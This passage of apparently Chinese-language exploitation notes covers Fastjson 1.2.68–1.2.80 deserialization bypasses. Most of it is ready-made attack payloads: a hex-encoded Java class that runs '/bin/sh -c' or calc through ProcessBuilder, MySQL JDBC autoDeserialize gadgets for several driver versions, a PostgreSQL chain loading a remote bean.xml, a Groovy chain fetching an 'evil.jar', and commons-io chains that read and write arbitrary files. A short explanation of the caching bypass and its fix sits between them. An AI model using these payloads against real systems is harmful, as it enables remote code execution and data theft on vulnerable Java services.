\\x62\\x69\\x6e\\x2f\\x73\\x68\\x08\\x00\\x2b\\x01\\x00\\x02\\x2d\\x63\\x08\\x00\\x2d\\x0c\\x00\\x08\\x00\\x06\\x09\\x00\\x02\\x00\\x2f\\x01\\x00\\x18\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x50\\x72\\x6f\\x63\\x65\\x73\\x73\\x42\\x75\\x69\\x6c\\x64\\x65\\x72\\x07\\x00\\x31\\x01\\x00\\x16\\x28\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x29\\x56\\x0c\\x00\\x09\\x00\\x33\\x0a\\x00\\x32\\x00\\x34\\x01\\x00\\x05\\x73\\x74\\x61\\x72\\x74\\x01\\x00\\x15\\x28\\x29\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x50\\x72\\x6f\\x63\\x65\\x73\\x73\\x3b\\x0c\\x00\\x36\\x00\\x37\\x0a\\x00\\x32\\x00\\x38\\x01\\x00\\x08\\x3c\\x63\\x6c\\x69\\x6e\\x69\\x74\\x3e\\x01\\x00\\x04\\x63\\x61\\x6c\\x63\\x08\\x00\\x3b\\x0a\\x00\\x02\\x00\\x0d\\x01\\x00\\x04\\x43\\x6f\\x64\\x65\\x01\\x00\\x0d\\x53\\x74\\x61\\x63\\x6b\\x4d\\x61\\x70\\x54\\x61\\x62\\x6c\\x65\\x0a\\x00\\x0c\\x00\\x0d\\x00\\x21\\x00\\x02\\x00\\x0c\\x00\\x00\\x00\\x03\\x00\\x09\\x00\\x05\\x00\\x06\\x00\\x00\\x00\\x09\\x00\\x07\\x00\\x06\\x00\\x00\\x00\\x09\\x00\\x08\\x00\\x06\\x00\\x00\\x00\\x02\\x00\\x01\\x00\\x09\\x00\\x0a\\x00\\x01\\x00\\x3e\\x00\\x00\\x00\\x84\\x00\\x04\\x00\\x02\\x00\\x00\\x00\\x53\\x2a\\xb7\\x00\\x40\\x12\\x10\\xb8\\x00\\x16\\xb6\\x00\\x1c\\x12\\x1e\\xb6\\x00\\x22\\x99\\x00\\x10\\x12\\x24\\xb3\\x00\\x26\\x12\\x28\\xb3\\x00\\x2a\\xa7\\x00\\x0d\\x12\\x2c\\xb3\\x00\\x26\\x12\\x2e\\xb3\\x00\\x2a\\x06\\xbd\\x00\\x18\\x59\\x03\\xb2\\x00\\x26\\x53\\x59\\x04\\xb2\\x00\\x2a\\x53\\x59\\x05\\xb2\\x00\\x30\\x53\\x4c\\xbb\\x00\\x32\\x59\\x2b\\xb7\\x00\\x35\\xb6\\x00\\x39\\x57\\xa7\\x00\\x04\\x4c\\xb1\\x00\\x01\\x00\\x04\\x00\\x4e\\x00\\x51\\x00\\x0c\\x00\\x01\\x00\\x3f\\x00\\x00\\x00\\x17\\x00\\x04\\xff\\x00\\x21\\x00\\x01\\x07\\x00\\x02\\x00\\x00\\x09\\x65\\x07\\x00\\x0c\\xfc\\x00\\x00\\x07\\x00\\x04\\x00\\x08\\x00\\x3a\\x00\\x0a\\x00\\x01\\x00\\x3e\\x00\\x00\\x00\\x1a\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x0e\\x12\\x3c\\xb3\\x00\\x30\\xbb\\x00\\x02\\x59\\xb7\\x00\\x3d\\x57\\xb1\\x00\\x00\\x00\\x00\\x00\\x00&quot;,              &#125;,           &quot;encoder&quot;: &quot;iso-8859-1&quot;,           &quot;charset&quot;: &quot;iso-8859-1&quot;,           &quot;charsetName&quot;: &quot;iso-8859-1&quot;,           &quot;bufferSize&quot;: 1        &#125;,        &quot;branch&quot;: &#123;          &quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,          &quot;writer&quot;: &#123;            &quot;@type&quot;: &quot;org.apache.commons.io.output.LockableFileWriter&quot;,            &quot;file&quot;: &quot;D:/1tmp/111.txt&quot;,            &quot;charset&quot;: &quot;iso-8859-1&quot;,            &quot;encoding&quot;: &quot;iso-8859-1&quot;,            &quot;lockDir&quot;: &quot;/tmp/test/&quot;,            &quot;append&quot;: false          &#125;,          &quot;charset&quot;:&quot;iso-8859-1&quot;,          &quot;charsetName&quot;:&quot;iso-8859-1&quot;,          &quot;bufferSize&quot;: 1024,          &quot;writeImmediately&quot;: true        &#125;,        &quot;closeBranch&quot;: true      &#125;    &#125;,  &quot;include&quot;:true,  &quot;boms&quot;:[&#123;                  &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,                  &quot;charsetName&quot;: &quot;iso-8859-1&quot;,                  &quot;bytes&quot;:[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]                &#125;],  &quot;x&quot;:&#123;&quot;$ref&quot;:&quot;$.bOM&quot;&#125;&#125;\n\n\n\n\n\nMysqlJdbc用到的关键类的分析：\nmysql驱动协议之loadbalance和replication-CSDN博客\n出网5.1.1 ~ 5.1.48：\n&#123;  &quot;x1&quot;: &#123;    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,    &quot;hostToConnectTo&quot;: &quot;127.0.0.1&quot;,    &quot;portToConnectTo&quot;: 3308,    &quot;info&quot;: &#123;      &quot;user&quot;: &quot;d6e26c4&quot;,      &quot;password&quot;: &quot;pass&quot;,      &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,      &quot;autoDeserialize&quot;: &quot;true&quot;,      &quot;NUM_HOSTS&quot;: &quot;1&quot;    &#125;,    &quot;databaseToConnectTo&quot;: &quot;test&quot;,    &quot;url&quot;: &quot;&quot;  &#125;&#125;\n\n\n\n6.0.2&#x2F;6.0.3：\n&#123;  &quot;x1&quot;: &#123;    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;,    &quot;proxy&quot;: &#123;      &quot;connectionString&quot;: &#123;        &quot;url&quot;: &quot;jdbc:mysql://127.0.0.1:3308/test?user=d6e26c4&amp;autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;      &#125;    &#125;  &#125;&#125;\n\n\n\n&lt;&#x3D;8.0.19：\n&#123;  &quot;x1&quot;: &#123;    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,    &quot;proxy&quot;: &#123;      &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,      &quot;connectionUrl&quot;: &#123;        &quot;@type&quot;: &quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;,        &quot;masters&quot;: [          &#123;&#125;        ],        &quot;slaves&quot;: [],        &quot;properties&quot;: &#123;          &quot;host&quot;: &quot;127.0.0.1&quot;,          &quot;port&quot;: &quot;3308&quot;,          &quot;user&quot;: &quot;d6e26c4&quot;,          &quot;dbname&quot;: &quot;test&quot;,          &quot;password&quot;: &quot;pass&quot;,          &quot;queryInterceptors&quot;: &quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,          &quot;autoDeserialize&quot;: &quot;true&quot;        &#125;      &#125;    &#125;  &#125;&#125;\n\n\n\n这里看一下8.0.19的调用栈：\nat com.mysql.cj.jdbc.ConnectionImpl.setAutoCommit(ConnectionImpl.java:2005)................at com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy.createConnectionForHost(LoadBalancedConnectionProxy.java:399)at com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy.createConnectionForHost(LoadBalancedConnectionProxy.java:446)at com.mysql.cj.jdbc.ha.RandomBalanceStrategy.pickConnection(RandomBalanceStrategy.java:77)at com.mysql.cj.jdbc.ha.RandomBalanceStrategy.pickConnection(RandomBalanceStrategy.java:44)at com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy.pickNewConnection(LoadBalancedConnectionProxy.java:345)at com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy.&lt;init&gt;(LoadBalancedConnectionProxy.java:247).....................at com.alibaba.fastjson.JSON.parse(JSON.java:149)at vul.MysqlAttack.mysql8(MysqlAttack.java:29)at vul.Bypass_68.main(Bypass_68.java:10)\n\n可以看到是从LoadBalancedConnectionProxy的构造方法里触发的。\n不出网（结合写文件）mysql还有不出网的利用方式，需要写pipe文件，然后本地加载：\nhttps://1diot9.github.io/2025/05/05/mysql-JDBC-%E7%BB%95%E8%BF%87/\n5.1.1~5.1.48:\n&#123;  &quot;x1&quot;: &#123;    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,    &quot;hostToConnectTo&quot;: &quot;127.0.0.1&quot;,    &quot;portToConnectTo&quot;: 3306,    &quot;info&quot;: &#123;      &quot;useSSL&quot;: &quot;false&quot;,      &quot;user&quot;: &quot;mysql&quot;,      &quot;HOST&quot;: &quot;xxx&quot;,      &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,      &quot;autoDeserialize&quot;: &quot;true&quot;,      &quot;NUM_HOSTS&quot;: &quot;1&quot;,      &quot;socketFactory&quot;: &quot;com.mysql.jdbc.NamedPipeSocketFactory&quot;,      &quot;namedPipePath&quot;: &quot;/tmp/mysql.pcap&quot;,      &quot;DBNAME&quot;: &quot;test&quot;    &#125;,    &quot;databaseToConnectTo&quot;: &quot;test&quot;,    &quot;url&quot;: &quot;&quot;  &#125;&#125;\n\n\n\n6.0.2&#x2F;6.0.3:\n&#123;    &quot;x1&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,        &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;,        &quot;proxy&quot;: &#123;            &quot;connectionString&quot;: &#123;                &quot;url&quot;: &quot;jdbc:mysql://xxx/test?useSSL=false&amp;autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=mysql&amp;socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&amp;namedPipePath=mysql&quot;            &#125;        &#125;    &#125;&#125;\n\n\n\n&lt;&#x3D;8.0.19\n&#123;  &quot;x1&quot;: &#123;    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,    &quot;proxy&quot;: &#123;      &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,      &quot;connectionUrl&quot;: &#123;        &quot;@type&quot;: &quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;,        &quot;masters&quot;: [          &#123;&#125;        ],        &quot;slaves&quot;: [],        &quot;properties&quot;: &#123;          &quot;host&quot;: &quot;xxx&quot;,          &quot;user&quot;: &quot;mysql&quot;,          &quot;queryInterceptors&quot;: &quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,          &quot;autoDeserialize&quot;: &quot;true&quot;,          &quot;socketFactory&quot;: &quot;com.mysql.cj.protocol.NamedPipeSocketFactory&quot;,          &quot;path&quot;: &quot;/tmp/mysql.pcap&quot;,          &quot;maxAllowedPacket&quot;: &quot;74996390&quot;,          &quot;dbname&quot;: &quot;test&quot;,          &quot;useSSL&quot;: &quot;false&quot;        &#125;      &#125;    &#125;  &#125;&#125;\n\n\n\nPostgreSql可以通过file或http协议，加载xml，配合ClassPathXml使用。\n9.4.1208 &lt;&#x3D; org.postgresql:postgresql &lt; 42.2.25 \n42.3.0 &lt;&#x3D; org.postgresql:postgresql &lt; 42.3.2\n&#123;    &quot;x1&quot;:&#123;        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,        &quot;@type&quot;: &quot;org.postgresql.jdbc.PgConnection&quot;,        &quot;hostSpecs&quot;: [            &#123;                &quot;host&quot;: &quot;127.0.0.1&quot;,                &quot;port&quot;: 2333            &#125;        ],        &quot;user&quot;: &quot;user&quot;,        &quot;database&quot;: &quot;test&quot;,        &quot;info&quot;: &#123;            &quot;socketFactory&quot;: &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;,            &quot;socketFactoryArg&quot;: &quot;http://127.0.0.1:8080/bean.xml&quot;        &#125;,url: &quot;&quot;    &#125;&#125;\n\n\n\n\n\n1.2.80绕过分析[https://changeyourway.github.io/2025/08/23/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Fastjson%201.2.68-1.2.80%20%E5%88%A9%E7%94%A8/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90](https://changeyourway.github.io/2025/08/23/Java 安全&#x2F;漏洞篇-Fastjson 1.2.68-1.2.80 利用&#x2F;#源码分析)\n将Exception作为期望类，找子类\n找到子类后，以下几个地方的类也可以通过修改json，从而手动添加到缓存中，从而创造新的可利用类：\n\npublic构造方法中，参数的类型（包括其子类）\npublic的字段类型\nsetter方法的参数类型（包括子类）\n\n所以可以一直往下找可利用类，直到找到能够利用的构造方法或是setter方法。\n一般是通过这种方式把前面的payload的利用类重新加入缓存，从而实现利用。\n这里的缓存点和47版本的不一样，是ParserConfig.getDeserializer时的缓存：\n\n\n将类型与反序列化器放入Map中。\ncheckAutoType时很早就取：\n\n而Exception类型的反序列化器ThrowableDeserializer在80版本有这么一行代码：\n\n这里会解析其他键值对，当value和实际字段的类型不符时，会执行cast方法，从而将类当中的属性也添加到缓存中，因为这里最后也会执行config.getDeserializer：\n\n看个例子：\n// 第一次发包&#123;    &quot;@type&quot;:&quot;java.lang.Exception&quot;,    &quot;@type&quot;:&quot;org.codehaus.groovy.control.CompilationFailedException&quot;,    &quot;unit&quot;:&#123;&#125;&#125;// 第二次发包&#123;    &quot;@type&quot;:&quot;org.codehaus.groovy.control.ProcessingUnit&quot;,    &quot;@type&quot;:&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;,    &quot;config&quot;:&#123;     &quot;@type&quot;:&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;,     &quot;classpathList&quot;:&quot;http://127.0.0.1:8090/evil.jar&quot;    &#125;&#125;\n\n这里就是把CompilationFailedException的unit字段也添加到缓存中。一般”field”: {}就行，因为{}是JSONObject类型，肯定会执行cast。\n修复分析\n对Throwable的子类做了判断，把从缓存取出的clazz清空。\njackson+io读写文件&#x2F;目录很适合Spring环境。\n缓存InputStream：\n&#123;  &#123;    &quot;@type&quot;: &quot;java.lang.Exception&quot;,    &quot;@type&quot;: &quot;com.fasterxml.jackson.core.exc.InputCoercionException&quot;,    &quot;p&quot;:&#123;&#125;  &#125;,  &#123;    &quot;@type&quot;: &quot;com.fasterxml.jackson.core.JsonParser&quot;,    &quot;@type&quot;: &quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser&quot;,    &quot;in&quot;:&#123;&#125;  &#125;&#125;\n\n\n\nio链逐字节读文件&#x2F;目录：\n和68版本时io读文件的思路一样\nhttps://github.com/luelueking/CVE-2022-25845-In-Spring   脚本\nhttps://github.com/kezibei/fastjson_payload/blob/main/web.py   出网脚本\n&#123;  &quot;a&quot;: &#123;    &quot;@type&quot;: &quot;java.io.InputStream&quot;,    &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,    &quot;delegate&quot;: &#123;      &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,      &quot;delegate&quot;: &#123;        &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,        &quot;reader&quot;: &#123;          &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,          &quot;url&quot;: &quot;$&#123;file&#125;&quot;        &#125;,        &quot;charsetName&quot;: &quot;UTF-8&quot;,        &quot;bufferSize&quot;: &quot;1024&quot;      &#125;,      &quot;boms&quot;: [        &#123;          &quot;charsetName&quot;: &quot;UTF-8&quot;,          &quot;bytes&quot;: $&#123;data&#125;        &#125;      ]    &#125;,    &quot;boms&quot;: [      &#123;        &quot;charsetName&quot;: &quot;UTF-8&quot;,        &quot;bytes&quot;: [1]      &#125;    ]  &#125;,  &quot;b&quot;: &#123;&quot;$ref&quot;:&quot;$.a.delegate&quot;&#125;&#125;\n\n\n\nio链写文件：\n&#123;  &quot;@type&quot;:&quot;java.io.InputStream&quot;,  &quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,  &quot;delegate&quot;:&#123;    &quot;@type&quot;: &quot;org.apache.commons.io.input.AutoCloseInputStream&quot;,    &quot;in&quot;: &#123;      &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,      &quot;input&quot;: &#123;        &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,        &quot;reader&quot;: &#123;           &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceReader&quot;,           &quot;charSequence&quot;: &#123;           &quot;@type&quot;: &quot;java.lang.String&quot;           &quot;\\x66\\x6C\\x61\\x67\\x7B\\x7B\\x7B&quot;,              &#125;,           &quot;encoder&quot;: &quot;iso-8859-1&quot;,           &quot;charset&quot;: &quot;iso-8859-1&quot;,           &quot;charsetName&quot;: &quot;iso-8859-1&quot;,           &quot;bufferSize&quot;: 1        &#125;,        &quot;branch&quot;: &#123;          &quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,          &quot;writer&quot;: &#123;            &quot;@type&quot;: &quot;org.apache.commons.io.output.LockableFileWriter&quot;,            &quot;file&quot;: &quot;D:/1tmp/111.txt&quot;,            &quot;charset&quot;: &quot;iso-8859-1&quot;,            &quot;encoding&quot;: &quot;iso-8859-1&quot;,            &quot;lockDir&quot;: &quot;/tmp/test/&quot;,            &quot;append&quot;: false          &#125;,          &quot;charset&quot;:&quot;iso-8859-1&quot;,          &quot;charsetName&quot;:&quot;iso-8859-1&quot;,          &quot;bufferSize&quot;: 1024,          &quot;writeImmediately&quot;: true        &#125;,        &quot;closeBranch&quot;: true      &#125;    &#125;,  &quot;include&quot;:true,  &quot;boms&quot;:[&#123;                  &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,                  &quot;charsetName&quot;: &quot;iso-8859-1&quot;,                  &quot;bytes&quot;:[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]                &#125;],  &quot;x&quot;:&#123;&quot;$ref&quot;:&quot;$.bOM&quot;&#125;&#125;\n\n触发：\n&#123;    &quot;@type&quot;: &quot;java.lang.Exception&quot;,    &quot;@type&quot;: &quot;Tomcat678910cmdechoException&quot;&#125;// 添加setCmd方法，或参数为cmd的构造方法&#123;    &quot;@type&quot;: &quot;java.lang.Exception&quot;,    &quot;@type&quot;: &quot;Tomcat678910cmdechoException&quot;    &quot;cmd&quot;: &quot;calc&quot;&#125;\n\n\n\n最终的利用类记得继承Exception。或者在类上使用@JSONType注解：\n\n推荐使用java-chains生成;\n\n\nPostgreSqljackson依赖1.2.75 